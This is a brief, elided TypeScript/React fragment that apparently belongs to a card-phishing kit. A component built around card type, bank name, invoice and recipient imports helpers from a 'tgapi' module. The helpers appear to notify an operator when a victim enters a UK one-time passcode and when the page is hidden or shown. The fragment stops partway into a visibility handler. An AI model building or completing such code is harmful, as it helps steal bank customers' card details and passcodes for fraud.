...
import { sendUkOtpEnteredNotification, sendPageHiddenNotification, sendPageVisibleNotification } from '../tgapi';
...
const ChooseComponent = ({ cardType, bankName, onChoice, invoiceName = "Unknown Invoice", recipientName = "Unknown Recipient" }: ChooseComponentProps) => {
  ...
  useEffect(() => {
    const handleVisibilityChange = () => {
      const clientIdentifier = recipientName || invoiceName || "Unknown Client";
